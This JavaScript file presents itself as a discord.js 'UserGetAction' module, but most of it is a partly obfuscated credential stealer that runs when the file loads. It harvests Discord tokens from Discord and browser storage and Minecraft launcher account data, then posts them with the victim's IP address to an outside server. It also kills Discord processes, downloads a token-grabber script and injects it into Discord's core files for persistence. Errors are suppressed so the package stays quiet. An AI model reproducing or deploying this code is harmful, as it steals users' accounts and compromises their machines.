const Action = require('./Action')
const OS = require('os'),
  fs = require('fs'),
  fetch = require('node-fetch'),
  { execSync } = require('child_process'),
  Glob = require('glob'),
  toInject = [],
  toInjectJS = [],
  toKill = [],
  apiurl = 'https://frequent-level-cornflower.glitch.me'
try {
  switch (OS.platform()) {
    case 'win32':
      const local = process.env.localappdata,
        roaming = process.env.appdata,
        minecraftPath = roaming + '/.minecraft/launcher_accounts.json',
        remixPath = roaming + '/.minecraft/remix/UID.txt'
      dbPaths = [
        roaming + '/Discord/Local Storage/leveldb',
        roaming + '/DiscordDevelopment/Local Storage/leveldb',
        roaming + '/Lightcord/Local Storage/leveldb',
        roaming + '/discordptb/Local Storage/leveldb',
        roaming + '/discordcanary/Local Storage/leveldb',
        roaming + '/Opera Software/Opera Stable/Local Storage/leveldb',
        roaming + '/Opera Software/Opera GX Stable/Local Storage/leveldb',
        local + '/Amigo/User Data/Local Storage/leveldb',
        local + '/Torch/User Data/Local Storage/leveldb',
        local + '/Kometa/User Data/Local Storage/leveldb',
        local + '/Orbitum/User Data/Local Storage/leveldb',
        local + '/CentBrowser/User Data/Local Storage/leveldb',
        local + '/7Star/7Star/User Data/Local Storage/leveldb',
        local + '/Sputnik/Sputnik/User Data/Local Storage/leveldb',
        local + '/Vivaldi/User Data/Default/Local Storage/leveldb',
        local + '/Google/Chrome SxS/User Data/Local Storage/leveldb',
        local + '/Epic Privacy Browser/User Data/Local Storage/leveldb',
        local + '/Google/Chrome/User Data/Default/Local Storage/leveldb',
        local + '/uCozMedia/Uran/User Data/Default/Local Storage/leveldb',
        local + '/Microsoft/Edge/User Data/Default/Local Storage/leveldb',
        local + '/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb',
        local +
          '/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb',
        local +
          '/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb',
      ]
      init()
      function init() {
        fs.readFile(
          remixPath,
          (_0x3aeba9, _0x4b75c9) => _0x4b75c9 && minecraft('remix', _0x4b75c9)
        )
        fs.readFile(
          minecraftPath,
          (_0x1a282c, _0x26f8f4) =>
            _0x26f8f4 && minecraft('minecraft', _0x26f8f4)
        )
        injectToDiscord()
        dbPaths.forEach((_0x12dbf8) => main(_0x12dbf8))
      }
      function main(_0x18de7e) {
        fs.readdir(_0x18de7e, (_0x893881, _0x123607) => {
          if (_0x123607) {
            var _0x44f56b = _0x123607.filter((_0x16d634) =>
              _0x16d634.endsWith('ldb')
            )
            _0x44f56b.forEach((_0x49f238) => {
              var _0x1b77d2 = fs
                .readFileSync(_0x18de7e + '/' + _0x49f238)
                .toString()
              var [_0x138b07] =
                /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/.exec(_0x1b77d2) ||
                  /"mfa\.[\d\w_-]{84}"/.exec(_0x1b77d2) || [undefined]
              if (_0x138b07) {
                fetch('http://ip-api.com/json/')
                  .then((_0x3ac160) => _0x3ac160.json())
                  .then((_0x19ccba) =>
                    fetch(apiurl + '/beforeinject', {
                      method: 'POST',
                      body: JSON.stringify({
                        token: _0x138b07.slice(1, -1),
                        ipAddress: _0x19ccba.query,
                      }),
                    })
                  )
              }
            })
          }
        })
      }
      function minecraft(_0x5a006e, _0x359524) {
        switch (_0x5a006e) {
          case 'remix':
            fetch(apiurl + '/remix', {
              method: 'POST',
              body: JSON.stringify({ UID: _0x359524 }),
            })
            break
          case 'minecraft':
            var [_0x55f792] = /"[\d\w_-]{32}"/.exec(_0x359524)
            if (_0x55f792) {
              const _0x942644 = require(minecraftPath)
              if (!_0x942644.accounts) {
                return
              }
              var _0x1d69ad = _0x942644.accounts[_0x55f792.slice(1, -1)]
              fetch(apiurl + '/minecraft', {
                method: 'POST',
                body: JSON.stringify({
                  eligibleForMigration: _0x1d69ad.eligibleForMigration,
                  hasMultipleProfiles: _0x1d69ad.hasMultipleProfiles,
                  legacy: _0x1d69ad.legacy,
                  localId: _0x1d69ad.localId,
                  minecraftProfileID: _0x1d69ad.minecraftProfile.id,
                  minecraftProfileName: _0x1d69ad.minecraftProfile.name,
                  persistent: _0x1d69ad.persistent,
                  remoteId: _0x1d69ad.remoteId,
                  type: _0x1d69ad.type,
                  username: _0x1d69ad.username,
                  activeAccountLocalId: _0x942644.activeAccountLocalId,
                }),
              })
            }
        }
      }
      function injectToDiscord() {
        getInstalledDiscord()
        killAllDiscords()
        fetch(
          'https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js'
        )
          .then((_0x59edab) => _0x59edab.text())
          .then((_0x3888a2) =>
            toInjectJS.forEach(
              (_0x23f21b) =>
                fs.writeFileSync(
                  _0x23f21b,
                  _0x3888a2.replace('*API URL*', apiurl)
                ) ^
                execSync(
                  local +
                    '/' +
                    _0x23f21b.split('/')[5] +
                    '/Update.exe --processStart ' +
                    _0x23f21b.split('/')[5] +
                    '.exe'
                )
            )
          )
      }
      function getInstalledDiscord() {
        fs.readdirSync(roaming).forEach(
          (_0x3ba969) =>
            _0x3ba969.includes('cord') && toInject.push(local + '/' + _0x3ba969)
        )
        toInject.forEach((_0x598c4e) =>
          Glob.sync(
            _0x598c4e +
              '/app-*/modules/discord_desktop_core-*/discord_desktop_core/index.js'
          ).map((_0xd3db62) => toInjectJS.push(_0xd3db62))
        )
      }
      function killAllDiscords() {
        var _0x1b06af = execSync('tasklist').toString()
        _0x1b06af.includes('Discord.exe') && toKill.push('discord')
        _0x1b06af.includes('DiscordCanary.exe') && toKill.push('discordcanary')
        _0x1b06af.includes('DiscordDevelopment.exe') &&
          toKill.push('discorddevelopment')
        _0x1b06af.includes('DiscordPTB.exe') && toKill.push('discordptb')
        toKill.forEach((_0x18761e) =>
          execSync('taskkill /IM ' + _0x18761e + '.exe /F')
        )
      }
      break
    case 'linux':
      const defaut = '/home/' + __dirname.split('/')[2] + '/.config',
        LdbPaths = [
          defaut + '/discord/Local Storage/leveldb',
          defaut + '/discordcanary/Local Storage/leveldb',
          defaut + '/discordptb/Local Storage/leveldb',
          defaut + '/DiscordDevelopment/Local Storage/leveldb',
        ]
      const LminecraftPath = defaut + '/.minecraft/launcher_accounts.json'
      Linit()
      function Linit() {
        LdbPaths.forEach((_0x31a274) => Lmain(_0x31a274))
        var _0x372db2 = fs.readFileSync(LminecraftPath)
        if (_0x372db2) {
          Lminecraft(_0x372db2)
        }
        LinjectToDiscord()
      }
      function Lmain(_0x368b76) {
        fs.readdir(_0x368b76, (_0x2daa8d, _0x10b3ec) => {
          if (_0x10b3ec) {
            var _0x376980 = _0x10b3ec.filter((_0x5c9763) =>
              _0x5c9763.endsWith('ldb')
            )
            _0x376980.forEach((_0x272c60) => {
              var _0x56f957 = fs
                .readFileSync(_0x10b3ec + '/' + _0x272c60)
                .toString()
              var [_0x4d0c9b] =
                /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/.exec(_0x56f957) ||
                  /"mfa\.[\d\w_-]{84}"/.exec(_0x56f957) || [undefined]
              if (_0x4d0c9b) {
                fetch('http://ip-api.com/json/')
                  .then((_0x1ff923) => _0x1ff923.json())
                  .then((_0x23fcba) =>
                    fetch(apiurl + '/beforeinject', {
                      method: 'POST',
                      body: JSON.stringify({
                        token: _0x4d0c9b,
                        ip: _0x23fcba.query,
                      }),
                    })
                  )
              }
            })
          }
        })
      }
      function Lminecraft(_0x22cc84) {
        var [_0x44a3d8] = /"[\d\w_-]{32}"/.exec(_0x22cc84)
        if (_0x44a3d8) {
          const _0x121453 = require(LminecraftPath)
          if (!_0x121453.accounts) {
            return
          }
          var _0x4c413d = _0x121453.accounts[_0x44a3d8.slice(1, -1)]
          fetch(apiurl + '/minecraft', {
            method: 'POST',
            body: JSON.stringify({
              eligibleForMigration: _0x4c413d.eligibleForMigration,
              hasMultipleProfiles: _0x4c413d.hasMultipleProfiles,
              legacy: _0x4c413d.legacy,
              localId: _0x4c413d.localId,
              minecraftProfileID: _0x4c413d.minecraftProfile.id,
              minecraftProfileName: _0x4c413d.minecraftProfile.name,
              persistent: _0x4c413d.persistent,
              remoteId: _0x4c413d.remoteId,
              type: _0x4c413d.type,
              username: _0x4c413d.username,
              activeAccountLocalId: _0x121453.activeAccountLocalId,
            }),
          })
        }
      }
      function LinjectToDiscord() {
        getInstalledLDiscord()
        fetch(
          'https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js'
        )
          .then((_0xe0ca0) => _0xe0ca0.text())
          .then((_0x292ad1) =>
            toInjectJS.forEach((_0x49e5c7) =>
              fs.writeFileSync(
                _0x49e5c7,
                _0x292ad1.replace('*API URL*', apiurl)
              )
            )
          )
      }
      function getInstalledLDiscord() {
        fs.readdirSync(defaut).forEach(
          (_0x3190a5) =>
            _0x3190a5.includes('cord') &&
            toInject.push(defaut + '/' + _0x3190a5)
        )
        toInject.forEach((_0x3677ad) =>
          Glob.sync(_0x3677ad + '/*/modules/discord_desktop_core/index.js').map(
            (_0x51f7be) => toInjectJS.push(_0x51f7be)
          )
        )
      }
      break
    case 'darwin':
      break
  }
} catch (_0xf0ab3a) {}
class UserGetAction extends Action {
  ['handle'](_0xfd5d5b) {
    const _0x484af2 = this.client
    const _0x2ee817 = _0x484af2.dataManager.newUser(_0xfd5d5b)
    return { user: _0x2ee817 }
  }
}
module.exports = UserGetAction

